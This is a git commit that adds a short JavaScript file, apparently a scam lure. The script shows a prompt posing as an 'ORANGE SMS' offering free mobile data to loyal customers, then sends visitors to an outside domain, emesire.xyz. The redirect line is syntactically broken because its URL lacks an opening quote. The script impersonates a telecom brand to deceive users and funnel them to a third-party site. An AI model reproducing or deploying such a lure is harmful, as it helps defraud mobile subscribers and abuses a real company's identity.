26c6526a7bcf934d27769aa7e344f91e340cb2c3
sureoffer <emesire247@gmail.com>
2025-06-09 07:15:50 -0700

    Create activation-orangedataoffer.js

---
+++ activation-orangedataoffer.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('ORANGE SMS: Cher client, veuillez vérifier si votre carte SIM Orange est éligible pour recevoir de 5 Go à 100 Go de données, récompense des anciens clients, appuyez sur Données gratuites pour vérifier maintenant ','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href=https://emesire.xyz/orangedataoffer';
+}
